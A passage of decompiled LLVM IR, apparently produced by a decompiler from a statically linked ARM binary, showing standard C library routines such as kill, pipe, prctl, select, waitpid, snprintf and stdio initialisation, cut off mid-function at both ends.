dec_label_pc_22f7c:                               ; preds = %dec_label_pc_22f54
  %v1_22f80 = sub i32 0, %v0_22f64
  %v3_22f84 = load i16, i16* @global_var_42934.3040, align 2
  %v4_22f84 = sext i16 %v3_22f84 to i32
  store i32 %v4_22f84, i32* @r3, align 4
  %v0_22f88 = call i32 @__aeabi_read_tp()
  store i32 %v0_22f88, i32* %r0.global-to-local, align 4
  %v2_22f8c = load i32, i32* @r3, align 4
  %v3_22f8c = add i32 %v2_22f8c, %v0_22f88
  %v4_22f8c = inttoptr i32 %v3_22f8c to i32*
  store i32 %v1_22f80, i32* %v4_22f8c, align 4
  %v0_22f94.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_22f94

dec_label_pc_22f94:                               ; preds = %dec_label_pc_22f54, %dec_label_pc_22f7c
  %v0_22f98 = phi i32 [ %v0_22f64, %dec_label_pc_22f54 ], [ -1, %dec_label_pc_22f7c ]
  %v0_22f94 = phi i32 [ %v0_22f54, %dec_label_pc_22f54 ], [ %v0_22f94.pre, %dec_label_pc_22f7c ]
  store i32 %v0_22f94, i32* %r0.global-to-local, align 4
  store i32 %v0_22f98, i32* @r7, align 4
  %v1_22f9c = call i32 @__libc_disable_asynccancel(i32 %v0_22f94)
  store i32 %v1_22f9c, i32* %r0.global-to-local, align 4
  %v0_22fa0.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_22fa0

dec_label_pc_22fa0:                               ; preds = %dec_label_pc_22f4c, %dec_label_pc_22f94
  %v0_22fa0 = phi i32 [ %v0_22f4c, %dec_label_pc_22f4c ], [ %v0_22fa0.pre, %dec_label_pc_22f94 ]
  store i32 %v0_22fa0, i32* %r0.global-to-local, align 4
  %v2_22fa8 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_22fa8, i32* @r4, align 4
  store i32 %v6_22ee8, i32* @r5, align 4
  store i32 %v12_22ee8, i32* @r7, align 4
  ret i32 %v0_22fa0

; uselistorder directives
  uselistorder i32 %v0_22fa0, { 1, 0 }
  uselistorder i32 %v0_22f94, { 1, 0 }
  uselistorder i32 %v0_22f64, { 1, 2, 0, 3 }
  uselistorder i32 %v0_22f0c, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 4, 3, 7, 5, 6, 0, 1 }
  uselistorder label %dec_label_pc_22fa0, { 1, 0 }
  uselistorder label %dec_label_pc_22f94, { 1, 0 }
  uselistorder label %dec_label_pc_22f4c, { 1, 0 }
}

define i32 @kill(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_22fc4 = load i32, i32* @r7, align 4
  store i32 %v3_22fc4, i32* %stack_var_-8, align 4
  %v0_22fd0 = load i32, i32* %r0.global-to-local, align 4
  %tmp = icmp ult i32 %v0_22fd0, -4095
  br i1 %tmp, label %dec_label_pc_22ff0, label %dec_label_pc_22fd8

dec_label_pc_22fd8:                               ; preds = %entry
  %v1_22fdc = sub i32 0, %v0_22fd0
  store i32 %v1_22fdc, i32* @r2, align 4
  %v3_22fe0 = load i16, i16* @global_var_42934.3040, align 2
  %v4_22fe0 = sext i16 %v3_22fe0 to i32
  %v0_22fe4 = call i32 @__aeabi_read_tp()
  %v0_22fe8 = load i32, i32* @r2, align 4
  %v3_22fe8 = add i32 %v4_22fe0, %v0_22fe4
  %v4_22fe8 = inttoptr i32 %v3_22fe8 to i32*
  store i32 %v0_22fe8, i32* %v4_22fe8, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_22ff0.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_22ff0

dec_label_pc_22ff0:                               ; preds = %entry, %dec_label_pc_22fd8
  %v1_22ff4 = phi i32 [ %v0_22fd0, %entry ], [ -1, %dec_label_pc_22fd8 ]
  %v2_22ff0 = phi i32 [ %v3_22fc4, %entry ], [ %v2_22ff0.pre, %dec_label_pc_22fd8 ]
  store i32 %v2_22ff0, i32* @r7, align 4
  ret i32 %v1_22ff4

; uselistorder directives
  uselistorder i32 %v0_22fd0, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_22ff0, { 1, 0 }
}

define i32 @__GI_pipe(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_22ffc = load i32, i32* @r7, align 4
  store i32 %v3_22ffc, i32* %stack_var_-8, align 4
  %v0_23008 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_23008, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_23008, -4095
  br i1 %tmp, label %dec_label_pc_23030, label %dec_label_pc_23018

dec_label_pc_23018:                               ; preds = %entry
  %v0_2301c = call i32 @__aeabi_read_tp()
  %v3_23020 = load i16, i16* @global_var_42934.3040, align 2
  %v4_23020 = sext i16 %v3_23020 to i32
  %v0_23024 = load i32, i32* %r2.global-to-local, align 4
  %v1_23024 = sub i32 0, %v0_23024
  store i32 %v1_23024, i32* %r2.global-to-local, align 4
  %v3_23028 = add i32 %v4_23020, %v0_2301c
  %v4_23028 = inttoptr i32 %v3_23028 to i32*
  store i32 %v1_23024, i32* %v4_23028, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_23030.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_23030

dec_label_pc_23030:                               ; preds = %entry, %dec_label_pc_23018
  %v1_23034 = phi i32 [ %v0_23008, %entry ], [ -1, %dec_label_pc_23018 ]
  %v2_23030 = phi i32 [ %v3_22ffc, %entry ], [ %v2_23030.pre, %dec_label_pc_23018 ]
  store i32 %v2_23030, i32* @r7, align 4
  ret i32 %v1_23034

; uselistorder directives
  uselistorder i32 %v0_23008, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_23030, { 1, 0 }
}

define i32 @prctl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_23074, label %dec_label_pc_2305c

dec_label_pc_2305c:                               ; preds = %entry
  %v0_23060 = call i32 @__aeabi_read_tp()
  %v3_23064 = load i16, i16* @global_var_42934.3040, align 2
  %v4_23064 = sext i16 %v3_23064 to i32
  %v0_23068 = load i32, i32* %r2.global-to-local, align 4
  %v1_23068 = sub i32 0, %v0_23068
  store i32 %v1_23068, i32* %r2.global-to-local, align 4
  %v3_2306c = add i32 %v4_23064, %v0_23060
  %v4_2306c = inttoptr i32 %v3_2306c to i32*
  store i32 %v1_23068, i32* %v4_2306c, align 4
  br label %dec_label_pc_23074

dec_label_pc_23074:                               ; preds = %entry, %dec_label_pc_2305c
  %v1_23078 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_2305c ]
  ret i32 %v1_23078

; uselistorder directives
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %dec_label_pc_23074, { 1, 0 }
}

define i32 @__syscall_select() local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v3_23080 = load i32, i32* @r4, align 4
  store i32 %v3_23080, i32* %stack_var_-12, align 4
  %v0_23090 = load i32, i32* @r0, align 4
  store i32 %v0_23090, i32* @r2, align 4
  %tmp = icmp ult i32 %v0_23090, -4095
  br i1 %tmp, label %dec_label_pc_230b8, label %dec_label_pc_230a0

dec_label_pc_230a0:                               ; preds = %entry
  %v0_230a4 = call i32 @__aeabi_read_tp()
  %v3_230a8 = load i16, i16* @global_var_42934.3040, align 2
  %v4_230a8 = sext i16 %v3_230a8 to i32
  %v0_230ac = load i32, i32* @r2, align 4
  %v1_230ac = sub i32 0, %v0_230ac
  store i32 %v1_230ac, i32* @r2, align 4
  %v3_230b0 = add i32 %v4_230a8, %v0_230a4
  %v4_230b0 = inttoptr i32 %v3_230b0 to i32*
  store i32 %v1_230ac, i32* %v4_230b0, align 4
  %v2_230b8.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_230b8

dec_label_pc_230b8:                               ; preds = %entry, %dec_label_pc_230a0
  %v1_230bc = phi i32 [ %v0_23090, %entry ], [ -1, %dec_label_pc_230a0 ]
  %v2_230b8 = phi i32 [ %v3_23080, %entry ], [ %v2_230b8.pre, %dec_label_pc_230a0 ]
  store i32 %v2_230b8, i32* @r4, align 4
  ret i32 %v1_230bc

; uselistorder directives
  uselistorder i32 %v0_23090, { 1, 0, 2 }
  uselistorder label %dec_label_pc_230b8, { 1, 0 }
}

define i32 @__libc_select(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_230c4 = load i32, i32* @r4, align 4
  store i32 %v3_230c4, i32* %stack_var_-28, align 4
  %v6_230c4 = load i32, i32* @r5, align 4
  %v9_230c4 = load i32, i32* @r6, align 4
  %v12_230c4 = load i32, i32* @r7, align 4
  %v15_230c4 = load i32, i32* @r8, align 4
  %v18_230c4 = load i32, i32* @sl, align 4
  %v21_230c4 = load i32, i32* @lr, align 4
  %v4_230d4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 29852) to i32*), align 4
  %v2_230dc = icmp eq i32 %v4_230d4, 0
  store i32 %arg1, i32* %sl.global-to-local, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg4, i32* @r8, align 4
  store i32 %arg5, i32* @r4, align 4
  br i1 %v2_230dc, label %dec_label_pc_230f8, label %entry.dec_label_pc_23104_crit_edge

entry.dec_label_pc_23104_crit_edge:               ; preds = %entry
  br label %dec_label_pc_23104

dec_label_pc_230f8:                               ; preds = %entry
  store i32 %v3_230c4, i32* @r4, align 4
  store i32 %v9_230c4, i32* @r6, align 4
  store i32 %v12_230c4, i32* @r7, align 4
  store i32 %v15_230c4, i32* @r8, align 4
  store i32 %v18_230c4, i32* %sl.global-to-local, align 4
  %v0_23100 = call i32 @__syscall_select()
  br label %dec_label_pc_23104

dec_label_pc_23104:                               ; preds = %entry.dec_label_pc_23104_crit_edge, %dec_label_pc_230f8
  %v0_23104 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_23104, i32* @r5, align 4
  %v0_23118 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v0_23118, i32* @r0, align 4
  %v0_23120 = call i32 @__syscall_select()
  store i32 %v0_23120, i32* @r4, align 4
  %v0_23128 = load i32, i32* @r5, align 4
  %v1_2312c = call i32 @__libc_disable_asynccancel(i32 %v0_23128)
  %v0_23130 = load i32, i32* @r4, align 4
  %v2_23138 = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_23138, i32* @r4, align 4
  store i32 %v6_230c4, i32* @r5, align 4
  store i32 %v9_230c4, i32* @r6, align 4
  store i32 %v12_230c4, i32* @r7, align 4
  store i32 %v15_230c4, i32* @r8, align 4
  store i32 %v18_230c4, i32* @sl, align 4
  store i32 %v21_230c4, i32* @lr, align 4
  ret i32 %v0_23130

; uselistorder directives
  uselistorder i32* %sl.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_23104, { 1, 0 }
}

define i32 @__GI_setsid() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_23148 = load i32, i32* @r7, align 4
  store i32 %v3_23148, i32* %stack_var_-8, align 4
  %v0_23154 = load i32, i32* @r0, align 4
  store i32 %v0_23154, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_23154, -4095
  br i1 %tmp, label %dec_label_pc_2317c, label %dec_label_pc_23164

dec_label_pc_23164:                               ; preds = %entry
  %v0_23168 = call i32 @__aeabi_read_tp()
  %v3_2316c = load i16, i16* @global_var_42934.3040, align 2
  %v4_2316c = sext i16 %v3_2316c to i32
  %v0_23170 = load i32, i32* %r2.global-to-local, align 4
  %v1_23170 = sub i32 0, %v0_23170
  store i32 %v1_23170, i32* %r2.global-to-local, align 4
  %v3_23174 = add i32 %v4_2316c, %v0_23168
  %v4_23174 = inttoptr i32 %v3_23174 to i32*
  store i32 %v1_23170, i32* %v4_23174, align 4
  %v2_2317c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_2317c

dec_label_pc_2317c:                               ; preds = %entry, %dec_label_pc_23164
  %v1_23180 = phi i32 [ %v0_23154, %entry ], [ -1, %dec_label_pc_23164 ]
  %v2_2317c = phi i32 [ %v3_23148, %entry ], [ %v2_2317c.pre, %dec_label_pc_23164 ]
  store i32 %v2_2317c, i32* @r7, align 4
  ret i32 %v1_23180

; uselistorder directives
  uselistorder i32 %v0_23154, { 1, 0, 2 }
  uselistorder label %dec_label_pc_2317c, { 1, 0 }
}

define i32 @__GI_sigprocmask(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v2_2318c = icmp eq i32* %arg2, null
  br i1 %v2_2318c, label %dec_label_pc_231d0, label %dec_label_pc_231a0

dec_label_pc_231a0:                               ; preds = %entry
  %v2_231a0 = load i32, i32* %arg2, align 4
  %v1_231a4 = icmp slt i32 %v2_231a0, 0
  br i1 %v1_231a4, label %dec_label_pc_231b8, label %dec_label_pc_231ac

dec_label_pc_231ac:                               ; preds = %dec_label_pc_231a0
  %tmp = ptrtoint i32* %arg2 to i32
  %.pre = add i32 %tmp, 4
  %.pre3 = inttoptr i32 %.pre to i32*
  %v3_231ac = load i32, i32* %.pre3, align 4
  %v1_231b0 = urem i32 %v3_231ac, 2
  %v2_231b0 = icmp eq i32 %v1_231b0, 0
  br i1 %v2_231b0, label %dec_label_pc_231d0, label %dec_label_pc_231b8

dec_label_pc_231b8:                               ; preds = %dec_label_pc_231a0, %dec_label_pc_231ac
  %v2_231b8 = load i32, i32* %arg2, align 4
  %tmp9 = bitcast i32 %v2_231b8 to float
  %tmp10 = call float @fabsf(float %tmp9)
  br label %dec_label_pc_231d0

dec_label_pc_231d0:                               ; preds = %dec_label_pc_231ac, %entry, %dec_label_pc_231b8
  %tmp11 = icmp ult i32 %arg1, -4095
  br i1 %tmp11, label %dec_label_pc_23204, label %dec_label_pc_231ec

dec_label_pc_231ec:                               ; preds = %dec_label_pc_231d0
  %v1_231f0 = sub i32 0, %arg1
  %v3_231f4 = load i16, i16* @global_var_42934.3040, align 2
  %v4_231f4 = sext i16 %v3_231f4 to i32
  %v0_231f8 = call i32 @__aeabi_read_tp()
  %v3_231fc = add i32 %v4_231f4, %v0_231f8
  %v4_231fc = inttoptr i32 %v3_231fc to i32*
  store i32 %v1_231f0, i32* %v4_231fc, align 4
  br label %dec_label_pc_23204

dec_label_pc_23204:                               ; preds = %dec_label_pc_231d0, %dec_label_pc_231ec
  %v1_2320c = phi i32 [ %arg1, %dec_label_pc_231d0 ], [ -1, %dec_label_pc_231ec ]
  ret i32 %v1_2320c

; uselistorder directives
  uselistorder i32* %arg2, { 0, 3, 1, 2 }
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %dec_label_pc_23204, { 1, 0 }
  uselistorder label %dec_label_pc_231d0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_231b8, { 1, 0 }
}

define i32 @__GI_time(i32* %arg1) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v2_23218 = ptrtoint i32* %stack_var_-16 to i32
  %v2_23228 = call i32 @gettimeofday(i32 %v2_23218, i32 0)
  %v2_2322c = load i32, i32* %stack_var_-16, align 4
  %v2_23230 = icmp eq i32* %arg1, null
  br i1 %v2_23230, label %bb6, label %bb

bb:                                               ; preds = %entry
  store i32 %v2_2322c, i32* %arg1, align 4
  br label %bb6

bb6:                                              ; preds = %entry, %bb
  ret i32 %v2_2322c

; uselistorder directives
  uselistorder label %bb6, { 1, 0 }
}

define i32 @__libc_waitpid(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %v3_23248 = load i32, i32* @r4, align 4
  store i32 %v3_23248, i32* %stack_var_-20, align 4
  %v6_23248 = load i32, i32* @r5, align 4
  %v9_23248 = load i32, i32* @r6, align 4
  %v12_23248 = load i32, i32* @r7, align 4
  %v4_23254 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 29852) to i32*), align 4
  store i32 %v4_23254, i32* @ip, align 4
  %v2_23258 = icmp eq i32 %v4_23254, 0
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  br i1 %v2_23258, label %dec_label_pc_23270, label %dec_label_pc_23280

dec_label_pc_23270:                               ; preds = %entry
  %v4_23274 = call i32 @wait4(i32 %arg1, i32 %arg2, i32 %arg3, i32 0)
  br label %dec_label_pc_232a8

dec_label_pc_23280:                               ; preds = %entry
  %v0_23280 = call i32 @__libc_enable_asynccancel()
  %v0_23284 = load i32, i32* @r6, align 4
  store i32 %v0_23280, i32* @r4, align 4
  %v0_2328c = load i32, i32* @r7, align 4
  %v0_23290 = load i32, i32* @r5, align 4
  %v4_23298 = call i32 @wait4(i32 %v0_23290, i32 %v0_23284, i32 %v0_2328c, i32 0)
  store i32 %v4_23298, i32* @r5, align 4
  %v0_232a0 = load i32, i32* @r4, align 4
  %v1_232a4 = call i32 @__libc_disable_asynccancel(i32 %v0_232a0)
  %v0_232a8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_232a8

dec_label_pc_232a8:                               ; preds = %dec_label_pc_23270, %dec_label_pc_23280
  %v0_232a8 = phi i32 [ %v4_23274, %dec_label_pc_23270 ], [ %v0_232a8.pre, %dec_label_pc_23280 ]
  %v2_232b0 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_232b0, i32* @r4, align 4
  store i32 %v6_23248, i32* @r5, align 4
  store i32 %v9_23248, i32* @r6, align 4
  store i32 %v12_23248, i32* @r7, align 4
  ret i32 %v0_232a8

; uselistorder directives
  uselistorder i32 (i32, i32, i32, i32)* @wait4, { 1, 0 }
  uselistorder label %dec_label_pc_232a8, { 1, 0 }
}

define i32 @isspace(i32 %arg1) local_unnamed_addr {
entry:
  %v4_232cc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 360) to i32*), align 4
  %v2_232d0 = mul i32 %arg1, 2
  %v2_232d4 = add i32 %v4_232cc, %v2_232d0
  %v3_232d4 = inttoptr i32 %v2_232d4 to i16*
  %v4_232d4 = load i16, i16* %v3_232d4, align 2
  %v6_232d4 = zext i16 %v4_232d4 to i32
  %v1_232d8 = and i32 %v6_232d4, 32
  ret i32 %v1_232d8
}

define i32 @__GI_toupper(i32 %arg1) local_unnamed_addr {
entry:
  %v1_232ec = add i32 %arg1, 128
  %v2_232f0 = icmp ugt i32 %v1_232ec, 383
  %v0_232f8 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_232f0, i32 %v0_232f8)
  %v4_23300 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 368) to i32*), align 4
  %v2_23304 = mul i32 %arg1, 2
  %v2_23308 = add i32 %v4_23300, %v2_23304
  %v3_23308 = inttoptr i32 %v2_23308 to i16*
  %v4_23308 = load i16, i16* %v3_23308, align 2
  %v6_23308 = sext i16 %v4_23308 to i32
  ret i32 %v6_23308
}

define i32 @__GI___errno_location() local_unnamed_addr {
entry:
  %v0_23318 = load i32, i32* @lr, align 4
  %v0_23320 = call i32 @__aeabi_read_tp()
  %v3_23324 = load i16, i16* @global_var_42934.3040, align 2
  %v4_23324 = sext i16 %v3_23324 to i32
  %v2_23328 = add i32 %v4_23324, %v0_23320
  store i32 %v0_23318, i32* @lr, align 4
  ret i32 %v2_23328
}

declare i32 @printf(i8*, ...) local_unnamed_addr

define i32 @__GI_snprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_-4, align 4
  %v2_23390 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_23390, i32* @r3, align 4
  store i32 %arg1, i32* @r2, align 4
  %v0_233a0 = call i32 @__GI_vsnprintf()
  ret i32 %v0_233a0

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @sprintf(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_-8, align 4
  %v2_233c0 = ptrtoint i32* %stack_var_-8 to i32
  store i32 %v2_233c0, i32* @r3, align 4
  store i32 -1, i32* @r1, align 4
  store i32 %arg1, i32* @r2, align 4
  %v0_233d4 = call i32 @__GI_vsnprintf()
  ret i32 %v0_233d4

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
  uselistorder i32 ()* @__GI_vsnprintf, { 1, 0 }
}

define i32 @__GI_vsnprintf() local_unnamed_addr {
entry:
  %stack_var_-96 = alloca i32, align 4
  %v3_233e8 = load i32, i32* @r4, align 4
  %v6_233e8 = load i32, i32* @r5, align 4
  %v9_233e8 = load i32, i32* @r6, align 4
  %v2_233fc = ptrtoint i32* %stack_var_-96 to i32
  %v0_23400 = load i32, i32* @r0, align 4
  store i32 %v0_23400, i32* @r4, align 4
  %v0_23404 = load i32, i32* @r2, align 4
  %v0_23408 = load i32, i32* @r1, align 4
  store i32 %v0_23408, i32* @r5, align 4
  %v1_23420 = sub i32 -1, %v0_23400
  store i32 %v1_23420, i32* @lr, align 4
  %v0_23424 = load i32, i32* @r3, align 4
  store i32 %v0_23424, i32* @r2, align 4
  %v3_2342c = icmp ult i32 %v0_23408, %v1_23420
  br i1 %v3_2342c, label %bb26, label %bb

bb:                                               ; preds = %entry
  store i32 %v1_23420, i32* @r5, align 4
  br label %bb26

bb26:                                             ; preds = %entry, %bb
  %v1_2343c = phi i32 [ %v0_23408, %entry ], [ %v1_23420, %bb ]
  %v2_2343c = add i32 %v1_2343c, %v0_23400
  store i32 %v2_2343c, i32* @ip, align 4
  store i32 0, i32* @r6, align 4
  store i32 208, i32* %stack_var_-96, align 4
  %v2_2347c = inttoptr i32 %v0_23404 to i8*
  %v3_2347c = call i32 @_vfprintf_internal(i32 %v2_233fc, i8* %v2_2347c)
  %v0_23480 = load i32, i32* @r5, align 4
  %v1_23480 = load i32, i32* @r6, align 4
  %v9_23480 = icmp eq i32 %v0_23480, %v1_23480
  br i1 %v9_23480, label %dec_label_pc_234a4, label %dec_label_pc_23488

dec_label_pc_23488:                               ; preds = %bb26
  %v9_23490 = icmp eq i32 %v1_2343c, 0
  br i1 %v9_23490, label %bb27, label %bb28

bb27:                                             ; preds = %dec_label_pc_23488
  %v2_23494 = add i32 %v0_23400, -1
  br label %bb28

bb28:                                             ; preds = %dec_label_pc_23488, %bb27
  %v1_23498 = phi i32 [ %v2_2343c, %dec_label_pc_23488 ], [ %v2_23494, %bb27 ]
  %v1_23498.v0_23474 = select i1 %v9_23490, i32 %v1_23498, i32 %v0_23400
  %stack_var_-80.0 = inttoptr i32 %v1_23498.v0_23474 to i8*
  %v1_234a0 = trunc i32 %v1_23480 to i8
  store i8 %v1_234a0, i8* %stack_var_-80.0, align 1
  br label %dec_label_pc_234a4

dec_label_pc_234a4:                               ; preds = %bb26, %bb28
  store i32 %v3_233e8, i32* @r4, align 4
  store i32 %v6_233e8, i32* @r5, align 4
  store i32 %v9_233e8, i32* @r6, align 4
  ret i32 %v3_2347c

; uselistorder directives
  uselistorder i1 %v9_23490, { 1, 0 }
  uselistorder i32 %v1_2343c, { 1, 0 }
  uselistorder i32 %v1_23420, { 3, 2, 1, 0 }
  uselistorder i32 %v0_23400, { 3, 2, 1, 0, 4 }
  uselistorder label %dec_label_pc_234a4, { 1, 0 }
  uselistorder label %bb28, { 1, 0 }
  uselistorder label %bb26, { 1, 0 }
}

define i32 @_stdio_init() local_unnamed_addr {
entry:
  %v0_234c0 = call i32 @__aeabi_read_tp()
  %v3_234c4 = load i16, i16* @global_var_42934.3040, align 2
  %v4_234c4 = sext i16 %v3_234c4 to i32
  store i32 %v4_234c4, i32* @r3, align 4
  store i32 %v0_234c0, i32* @r5, align 4
  store i32 0, i32* @r0, align 4
  %v2_234d0 = add i32 %v4_234c4, %v0_234c0
  %v3_234d0 = inttoptr i32 %v2_234d0 to i32*
  %v4_234d0 = load i32, i32* %v3_234d0, align 4
  store i32 %v4_234d0, i32* @r6, align 4
  %v1_234d4 = call i32 @isatty(i32 0)
  %v2_234dc = icmp eq i32 %v1_234d4, 0
  store i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32* @r4, align 4
  br i1 %v2_234dc, label %bb, label %.thread2

bb:                                               ; preds = %entry
  %v5_234e8 = load i16, i16* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 400) to i16*), align 4
  %v7_234e8 = zext i16 %v5_234e8 to i32
  %v2_234ec = xor i32 %v7_234e8, 256
  store i32 %v2_234ec, i32* @r3, align 4
  %v2_234f0 = trunc i32 %v2_234ec to i16
  store i16 %v2_234f0, i16* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 400) to i16*), align 4
  br label %.thread2

.thread2:                                         ; preds = %entry, %bb
  store i32 1, i32* @r0, align 4
  %v1_234f8 = call i32 @isatty(i32 1)
  %v2_234fc = icmp eq i32 %v1_234f8, 0
  br i1 %v2_234fc, label %bb11, label %.thread6

bb11:                                             ; preds = %.thread2
  %v1_23504 = load i32, i32* @r4, align 4
  %v2_23508 = add i32 %v1_23504, 468
  %v3_23508 = inttoptr i32 %v2_23508 to i16*
  %v4_23508 = load i16, i16* %v3_23508, align 2
  %v2_2350c = xor i16 %v4_23508, 256
  store i16 %v2_2350c, i16* %v3_23508, align 2
  br label %.thread6

.thread6:                                         ; preds = %.thread2, %bb11
  %v3_23518 = load i16, i16* @global_var_42934.3040, align 2
  %v4_23518 = sext i16 %v3_23518 to i32
  %v0_2351c = load i32, i32* @r6, align 4
  %v1_2351c = load i32, i32* @r5, align 4
  %v3_2351c = add i32 %v1_2351c, %v4_23518
  %v4_2351c = inttoptr i32 %v3_2351c to i32*
  store i32 %v0_2351c, i32* %v4_2351c, align 4
  ret i32 %v1_234f8

; uselistorder directives
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @_stdio_term() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_23538 = load i32, i32* @r4, align 4
  store i32 %v3_23538, i32* %stack_var_-28, align 4
  store i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32* %r7.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 -37576), i32* %r3.global-to-local, align 4
  %v2_2354c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 -37576) to i32*), align 4
  store i32 %v2_2354c, i32* %r0.global-to-local, align 4
  %v5_2354c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 -37572) to i32*), align 4
  store i32 %v5_2354c, i32* %r1.global-to-local, align 4
  %v8_2354c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 -37568) to i32*), align 4
  %v2_23554 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_23554, i32* %r3.global-to-local, align 4
  store i32 %v2_2354c, i32* %stack_var_-44, align 4
  store i32 168, i32* %r2.global-to-local, align 4
  %v4_23560 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 168) to i32*), align 4
  store i32 %v2_2354c, i32* %r0.global-to-local, align 4
  store i32 %v5_2354c, i32* %r1.global-to-local, align 4
  store i32 %v8_2354c, i32* %r2.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 -37588), i32* %r3.global-to-local, align 4
  %v1_23570 = inttoptr i32 %v4_23560 to i32*
  store i32 %v2_2354c, i32* %v1_23570, align 4
  %v3_23570 = add i32 %v4_23560, 4
  %v4_23570 = inttoptr i32 %v3_23570 to i32*
  %v5_23570 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_23570, i32* %v4_23570, align 4
  %v6_23570 = add i32 %v4_23560, 8
  %v7_23570 = inttoptr i32 %v6_23570 to i32*
  %v8_23570 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_23570, i32* %v7_23570, align 4
  %v0_23574 = load i32, i32* %r3.global-to-local, align 4
